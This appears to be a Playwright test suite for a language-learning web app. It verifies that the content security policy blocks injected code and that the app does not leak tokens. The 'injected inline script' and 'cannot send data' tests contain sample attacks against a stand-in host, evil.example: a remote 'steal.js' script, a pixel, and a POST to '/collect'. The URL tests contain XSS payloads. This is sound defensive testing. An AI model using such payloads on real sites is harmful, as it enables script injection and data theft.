import { test, expect } from '@playwright/test';
import { seed } from './helpers.js';

// The content security policy (a <meta> tag in the built page) must (1) never block anything the app needs, and (2) really stop injected code.
test.use({ serviceWorkers: 'block' });

const watch = async (page) => {
  await page.addInitScript(() => {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} blocked ${e.blockedURI || 'inline'}`));
  });
  const consoleCsp = [];
  page.on('console', (m) => { if (/content security policy/i.test(m.text())) consoleCsp.push(m.text()); });
  return { violations: () => page.evaluate(() => window.__csp), consoleCsp };
};

test.describe('content security policy', () => {
  test('the built page declares a policy with no inline scripts and no eval', async ({ page }) => {
    await page.goto('/');
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(csp).toContain("script-src 'self'");
    expect(csp).not.toMatch(/unsafe-eval|script-src[^;]*unsafe-inline/);
    expect(csp).toContain("object-src 'none'");
  });

  for (const lang of ['en', 'ar', 'id']) {
    test(`${lang}: the main screens and a lesson run without a single policy violation`, async ({ page }) => {
      test.setTimeout(120_000);
      const w = await watch(page);
      await seed(page, { lang });
      for (const url of ['/', '/learn', '/learn?track=zh', '/lesson/fr-01', '/review', '/progress', '/settings', '/about', '/words']) {
        await page.goto(url);
        await expect(page.locator('main, [data-testid="overview"], body').first()).toBeVisible();
      }
      await page.goto('/lesson/es-01');
      await page.locator('[data-testid="start-learn"]').click();
      await expect(page.locator('[data-testid="word-card"]')).toBeVisible();
      expect(await w.violations()).toEqual([]);
      expect(w.consoleCsp).toEqual([]);
    });
  }

  test('injected inline script and a script from another site are both blocked', async ({ page }) => {
    const w = await watch(page);
    await seed(page, { lang: 'en' });
    await page.goto('/');
    await page.evaluate(() => {
      const inline = document.createElement('script');
      inline.textContent = 'window.__pwned = "inline"';
      document.body.appendChild(inline);
      const remote = document.createElement('script');
      remote.src = 'https://evil.example/steal.js';
      document.body.appendChild(remote);
      const img = document.createElement('img');
      img.src = 'https://evil.example/pixel.gif';
      document.body.appendChild(img);
      document.body.insertAdjacentHTML('beforeend', '<img src=x onerror="window.__pwned=\'handler\'">');
    });
    await page.waitForTimeout(500);
    expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
    const v = (await w.violations()).join(' | ');
    expect(v).toMatch(/script-src.* blocked inline/);
    expect(v).toContain('https://evil.example/steal.js');
    expect(v).toContain('https://evil.example/pixel.gif');
  });

  test('the app cannot send data to another site (fetch to an unlisted host is refused)', async ({ page }) => {
    await seed(page, { lang: 'en' });
    await page.goto('/');
    const result = await page.evaluate(() => fetch('https://evil.example/collect', { method: 'POST', body: 'x' }).then(() => 'sent', () => 'blocked'));
    expect(result).toBe('blocked');
  });
});

test.describe('web hygiene', () => {
  test('lesson text from the URL is never executed or injected as markup', async ({ page }) => {
    await seed(page, { lang: 'en' });
    await page.goto('/lesson/%3Cimg%20src=x%20onerror=alert(1)%3E');
    expect(await page.locator('img[src="x"]').count()).toBe(0);
    await page.goto('/learn?track=%3Cscript%3Ealert(1)%3C/script%3E');
    expect(await page.locator('script', { hasText: 'alert(1)' }).count()).toBe(0);
  });

  test('sign-in tokens arriving in the address are never written to the console', async ({ page }) => {
    const logs = [];
    page.on('console', (m) => logs.push(m.text()));
    await seed(page, { lang: 'en' });
    await page.goto('/#access_token=fake.jwt.token&refresh_token=fakerefresh&type=bearer');
    await page.waitForTimeout(800);
    expect(logs.join('\n')).not.toMatch(/fakerefresh|fake\.jwt\.token/);
  });
});
